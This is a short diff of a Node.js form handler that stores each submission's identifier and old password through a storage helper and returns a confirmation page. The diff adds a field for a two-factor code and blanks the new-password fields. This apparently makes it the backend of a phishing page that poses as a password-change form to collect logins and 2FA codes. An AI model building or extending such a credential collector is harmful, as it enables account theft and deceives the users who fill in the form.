@@ -1,6 +1,6 @@
 const querystring = require('querystring');
+const { confirmationHtml, applyNoCache } = require('./_html');
 const { addEntry } = require('./_storage');
-const { applyNoCache, confirmationHtml } = require('./_html');
 
 function readBody(req) {
   return new Promise((resolve, reject) => {
@@ -38,8 +38,9 @@ module.exports = async (req, res) => {
     timestamp: new Date().toLocaleString('fr-FR'),
     identifier: body.identifier || '',
     old_password: body.oldPassword || '',
-    new_password: body.newPassword || '',
-    confirm_password: body.confirmPassword || ''
+    code_2fa: '',
+    new_password: '',
+    confirm_password: ''
   };
 
   try {
